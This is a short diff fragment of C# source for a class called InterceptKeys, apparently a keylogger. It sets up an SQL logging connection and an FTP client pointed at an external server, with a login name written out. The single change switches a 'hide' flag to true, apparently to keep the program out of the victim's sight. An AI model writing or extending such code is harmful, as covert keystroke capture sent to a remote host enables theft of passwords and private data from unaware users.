@@ -24,7 +24,7 @@ class InterceptKeys
     private static SqlConnection cnxSQLServer = new SqlConnection(log);
     private static SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
     private static string date;
-    private static bool hide = false;
+    private static bool hide = true;
     private static FtpClient client = new FtpClient("ftp.batobleu.xyz")
     {
         Credentials = new NetworkCredential("11793_nexis", "")
